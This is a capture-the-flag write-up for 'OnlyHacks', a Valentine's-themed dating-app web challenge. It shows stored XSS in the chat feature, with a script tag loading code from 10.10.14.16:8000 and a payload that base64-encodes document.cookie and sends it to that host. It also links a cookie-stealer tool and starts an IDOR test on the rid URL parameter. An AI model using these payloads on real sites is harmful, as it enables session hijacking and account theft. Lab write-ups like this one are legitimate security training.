---
description: >-
  OnlyHacks is a Valentines-themed Web/Dating app challenge that simulates a
  online dating and matching platform.
---

# OnlyHacks

### **Challenge Scenario**

Dating and matching can be exciting especially during Valentine's, but it’s important to stay vigilant for impostors. Can you help identify possible frauds?

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* Usually, if I'm presented with a login form with a sign-up button, I first sign up for an account before testing the login form itself.

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

* The app is a dating app that matches you with potential dates

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

* Navigated to the `Matches section`, where I found a match with a user named Renata.
* This opened up a chat feature with her
* Things to test for :

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Snippet form my notes

#### Work Around 1 - Cookie Stealing

_**Testing for Stored XXS**_

```bash
python3 -m http.server

<script src="<http://10.10.14.16:8000/Dating.txt>"></script>
```

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

* And we have confirmed that the chatbot is vulnerable to `xxs` as shown above

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

* The session cookie `httpOnly` set se to false
* If `HttpOnly` is NOT set, `document.cookie` will actually return the session token, meaning this stored XSS could lead to full session hijacking of anyone who views that chat potentially an admin or the Renata bot's "operator" view if one exists.

#### Stealling the cookie

```bash
<script>new Image().src="<http://10.10.14.16:8000/log?c=>"+btoa(document.cookie);</script>

```

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

_**Decoding the cookie**_

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

* [https://github.com/TeneBrae93/xss-cookie-stealer](https://github.com/TeneBrae93/xss-cookie-stealer)
* Now what lefts for us is to add the session cookie

#### Work around 2 IDOR

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

* The URL has `?rid=6#last_message`.
* That `rid` is exactly the kind of thing to test for IDOR. What happens if i change the number ??

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
